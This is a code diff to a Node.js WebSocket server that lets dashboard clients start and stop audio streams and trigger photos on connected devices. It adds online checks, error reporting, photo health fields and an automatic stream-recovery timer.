@@ -80,6 +80,48 @@ const devices = new Map();
 /** @type {Set<WebSocket>} Dashboard clients */
 const dashboardClients = new Set();
 
+function sendTextToDevice(deviceId, text) {
+  const dev = devices.get(deviceId);
+  if (!dev || !dev.ws || dev.ws.readyState !== WebSocket.OPEN) {
+    broadcastToDashboard({
+      type: "error",
+      message: `Device ${deviceId} is offline`,
+    });
+    return false;
+  }
+  try {
+    dev.ws.send(text);
+    return true;
+  } catch (e) {
+    broadcastToDashboard({
+      type: "error",
+      message: `Failed to send command to ${deviceId}: ${e.message}`,
+    });
+    return false;
+  }
+}
+
+function sendJsonToDevice(deviceId, payload) {
+  const dev = devices.get(deviceId);
+  if (!dev || !dev.ws || dev.ws.readyState !== WebSocket.OPEN) {
+    broadcastToDashboard({
+      type: "error",
+      message: `Device ${deviceId} is offline`,
+    });
+    return false;
+  }
+  try {
+    sendJson(dev.ws, payload);
+    return true;
+  } catch (e) {
+    broadcastToDashboard({
+      type: "error",
+      message: `Failed to send command to ${deviceId}: ${e.message}`,
+    });
+    return false;
+  }
+}
+
 // ════════════════════════════════════════════════════════════════════
 // Single HTTP server — all traffic on one port
 // ════════════════════════════════════════════════════════════════════
@@ -173,7 +215,7 @@ function handleAudioDevice(ws, req) {
 
   // If dashboards are already watching, start the mic immediately
   if (dashboardClients.size > 0) {
-    ws.send("start_stream");
+    sendTextToDevice(deviceId, "start_stream");
     console.log(`🎙️  Auto-sent start_stream to new device: ${deviceId}`);
   }
 
@@ -231,7 +273,7 @@ function handleAudioDevice(ws, req) {
               data: json.data,
             });
           } else if (json.type === "health_status") {
-            const dev = devices.get(deviceId);
+            let dev = devices.get(deviceId);
             if (dev) {
               dev.health = {
                 wsConnected: json.wsConnected !== false,
@@ -264,6 +306,13 @@ function handleAudioDevice(ws, req) {
                   : null,
                 charging:
                   typeof json.charging === "boolean" ? json.charging : null,
+                photoAi: json.photoAi !== false,
+                photoQuality: String(
+                  json.photoQuality || dev.health?.photoQuality || "normal",
+                ),
+                photoNight: String(
+                  json.photoNight || dev.health?.photoNight || "off",
+                ),
               };
             }
             broadcastToDashboard({
@@ -383,7 +432,7 @@ function handleDashboard(ws) {
   // First dashboard connected — wake up all device mics
   if (wasEmpty) {
     devices.forEach((dev, id) => {
-      dev.ws.send("start_stream");
+      sendTextToDevice(id, "start_stream");
       console.log(`🎙️  start_stream → ${id}`);
     });
   }
@@ -423,13 +472,15 @@ function handleDashboard(ws) {
       const device = devices.get(targetId);
       switch (cmd) {
         case "start_stream":
-          device.ws.send("start_stream");
-          broadcastToDashboard({ type: "stream_started", deviceId: targetId });
+          if (sendTextToDevice(targetId, "start_stream")) {
+            broadcastToDashboard({ type: "stream_started", deviceId: targetId });
+          }
           break;
         case "stop_stream":
           stopDeviceRecording(targetId, device);
-          device.ws.send("stop_stream");
-          broadcastToDashboard({ type: "stream_stopped", deviceId: targetId });
+          if (sendTextToDevice(targetId, "stop_stream")) {
+            broadcastToDashboard({ type: "stream_stopped", deviceId: targetId });
+          }
           break;
         case "start_record":
           startDeviceRecording(targetId, device);
@@ -494,7 +545,7 @@ function handleDashboard(ws) {
           });
           break;
         case "take_photo":
-          sendJson(device.ws, {
+          sendJsonToDevice(targetId, {
             type: "take_photo",
             camera: String(msg.camera || "current").toLowerCase(),
           });
@@ -552,12 +603,26 @@ function handleDashboard(ws) {
     // Last dashboard left — stop all device mics
     if (dashboardClients.size === 0) {
       devices.forEach((dev, id) => {
-        dev.ws.send("stop_stream");
+        sendTextToDevice(id, "stop_stream");
         console.log(`🔇  stop_stream → ${id}`);
       });
     }
   });
 }
+
+setInterval(() => {
+  if (dashboardClients.size === 0) return;
+  const now = Date.now();
+  devices.forEach((dev, deviceId) => {
+    if (!dev || !dev.ws || dev.ws.readyState !== WebSocket.OPEN) return;
+    const lastAudio = Number(dev.health?.lastAudioChunkAt || 0);
+    const stale = !lastAudio || now - lastAudio > 25_000;
+    if (stale) {
+      sendTextToDevice(deviceId, "start_stream");
+      broadcastToDashboard({ type: "stream_recovery_sent", deviceId });
+    }
+  });
+}, 20_000);
 
 // ════════════════════════════════════════════════════════════════════
 // HTTP routes
